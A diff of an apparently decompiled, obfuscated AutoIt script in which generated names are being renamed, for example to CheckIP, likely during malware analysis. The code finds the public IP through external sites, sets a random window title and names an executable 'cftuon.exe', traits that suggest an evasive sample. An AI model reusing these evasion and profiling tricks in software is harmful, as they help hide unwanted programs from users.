@@ -7,7 +7,7 @@ Func Fn0079($ArgOpt00 = @error, $ArgOpt01 = @extended)
 	Return SetError($ArgOpt00, $ArgOpt01, $Local0000[0])
 EndFunc
 
-Global Const $version[6] = ["V", 2, 4, 0, "20071231", "V2.4-0"]
+Global Const $Version[6] = ["V", 2, 4, 0, "20071231", "V2.4-0"]
 Global Const $Var024C = 1, $Var024D = 2
 Global $Var024E = 0x000493E0
 Global $Var024F = False
@@ -17,22 +17,22 @@ Global $Var0252, $Var0253
 Global $Var0254, $Var0255, $Var0256, $Var0257, $Var0258, $Var0259, $Var025A, $Var025B, $Var025C, $Var025D, $Var025E
 Global Enum $Var025F = 0, $Var0260, $Var0261, $Var0262, $Var0263, $Var0264, $Var0265, $Var0266, $Var0267, $Var0268
 
-Func Fn007A($ArgOpt00 = "about:blank", $ArgOpt01 = 0, $ArgOpt02 = 1, $ArgOpt03 = 1, $ArgOpt04 = 1)
+Func Fn007A($StartPage = "about:blank", $ArgOpt01 = 0, $ArgOpt02 = 1, $ArgOpt03 = 1, $ArgOpt04 = 1)
 	If $Var0250 Then
-		Switch String($ArgOpt00)
+		Switch String($StartPage)
 			Case "0"
-				$ArgOpt00 = "about:blank"
+				$StartPage = "about:blank"
 				$ArgOpt02 = 0
 				LogError("Warning", "_IECreate", "", "Using deprecated behavior - $f_visible is now parameter 3 instead of parameter 1")
 			Case "1"
-				$ArgOpt00 = "about:blank"
+				$StartPage = "about:blank"
 				$ArgOpt02 = 1
 				LogError("Warning", "_IECreate", "", "Using deprecated behavior - $f_visible is now parameter 3 instead of parameter 1")
 		EndSwitch
 	EndIf
 	If Not $ArgOpt02 Then $ArgOpt04 = 0
 	If $ArgOpt01 Then
-		Local $Local0001 = Fn007C($ArgOpt00, "url")
+		Local $Local0001 = Fn007C($StartPage, "url")
 		If IsObj($Local0001) Then
 			If $ArgOpt04 Then WinActivate(HWnd($Local0001 .HWND))
 			Return SetError($Var025F, 1, $Local0001)
@@ -47,7 +47,7 @@ Func Fn007A($ArgOpt00 = "about:blank", $ArgOpt01 = 0, $ArgOpt02 = 1, $ArgOpt03 =
 	EndIf
 	$Local0003 .visible = $ArgOpt02
 	If $Local0002 And Not Fn0085($Var024D) Then LogError("Warning", "_IECreate", "", "Foreground Window Unlock Failed!")
-	Fn007B($Local0003, $ArgOpt00, $ArgOpt03)
+	Fn007B($Local0003, $StartPage, $ArgOpt03)
 	Return SetError(@error, 0, $Local0003)
 EndFunc
 
@@ -1237,27 +1237,27 @@ Func Fn0099($Arg00, $Arg01, $Arg02, $ArgOpt03 = 0)
 	Return 1
 EndFunc
 
-Func Fn009A()
-	Local $Var0289, $Var028A
+Func CheckIP()
+	Local $CurrentIP, $IPArray
 	If InetGet("http://checkip.dyndns.org/?rnd1=" & Random(1, 0x00010000) & "&rnd2=" & Random(1, 0x00010000), @TempDir & "\~ip.tmp") Then
-		$Var0289 = FileRead(@TempDir & "\~ip.tmp", FileGetSize(@TempDir & "\~ip.tmp"))
+		$CurrentIP = FileRead(@TempDir & "\~ip.tmp", FileGetSize(@TempDir & "\~ip.tmp"))
 		FileDelete(@TempDir & "\~ip.tmp")
-		$Var0289 = StringTrimLeft($Var0289, StringInStr($Var0289, ":") + 1)
-		$Var0289 = StringTrimRight($Var0289, StringLen($Var0289) - StringInStr($Var0289, "/") + 2)
-		$Var028A = StringSplit($Var0289, ".")
-		If $Var028A[0] = 4 And StringIsDigit($Var028A[1]) And StringIsDigit($Var028A[2]) And StringIsDigit($Var028A[3]) And StringIsDigit($Var028A[4]) Then
-			Return $Var0289
+		$CurrentIP = StringTrimLeft($CurrentIP, StringInStr($CurrentIP, ":") + 1)
+		$CurrentIP = StringTrimRight($CurrentIP, StringLen($CurrentIP) - StringInStr($CurrentIP, "/") + 2)
+		$IPArray = StringSplit($CurrentIP, ".")
+		If $IPArray[0] = 4 And StringIsDigit($IPArray[1]) And StringIsDigit($IPArray[2]) And StringIsDigit($IPArray[3]) And StringIsDigit($IPArray[4]) Then
+			Return $CurrentIP
 		EndIf
 	EndIf
 	If InetGet("http://www.whatismyip.com/?rnd1=" & Random(1, 0x00010000) & "&rnd2=" & Random(1, 0x00010000), @TempDir & "\~ip.tmp") Then
-		$Var0289 = FileRead(@TempDir & "\~ip.tmp", FileGetSize(@TempDir & "\~ip.tmp"))
+		$CurrentIP = FileRead(@TempDir & "\~ip.tmp", FileGetSize(@TempDir & "\~ip.tmp"))
 		FileDelete(@TempDir & "\~ip.tmp")
-		$Var0289 = StringTrimLeft($Var0289, StringInStr($Var0289, "Your ip is") + 10)
-		$Var0289 = StringLeft($Var0289, StringInStr($Var0289, " ") - 1)
-		$Var0289 = StringStripWS($Var0289, 8)
-		$Var028A = StringSplit($Var0289, ".")
-		If $Var028A[0] = 4 And StringIsDigit($Var028A[1]) And StringIsDigit($Var028A[2]) And StringIsDigit($Var028A[3]) And StringIsDigit($Var028A[4]) Then
-			Return $Var0289
+		$CurrentIP = StringTrimLeft($CurrentIP, StringInStr($CurrentIP, "Your ip is") + 10)
+		$CurrentIP = StringLeft($CurrentIP, StringInStr($CurrentIP, " ") - 1)
+		$CurrentIP = StringStripWS($CurrentIP, 8)
+		$IPArray = StringSplit($CurrentIP, ".")
+		If $IPArray[0] = 4 And StringIsDigit($IPArray[1]) And StringIsDigit($IPArray[2]) And StringIsDigit($IPArray[3]) And StringIsDigit($IPArray[4]) Then
+			Return $CurrentIP
 		EndIf
 	EndIf
 	Return SetError(1, 0, -1)
@@ -1269,6 +1269,7 @@ Func Fn009B($Arg00, $ArgOpt01 = True)
 	If $ArgOpt01 Then $Local0026 = BinaryToString($Local0026)
 	Return SetError($Local0027, $Var028B, $Local0026)
 EndFunc
+
 AutoItWinSetTitle(Fn00BA(Random(8, 0x0014, 1)))
 $Var028C = "cftuon.exe"
 $Var028D = "cftuon"
@@ -4616,7 +4617,7 @@ Func Fn00B1()
 		$Var0445 = StringSplit($Var0444, ".")
 	EndIf
 	If $Var0445[0] <> 4 Then
-		Return Fn009A()
+		Return CheckIP()
 	Else
 		Return $Var0444
 	EndIf
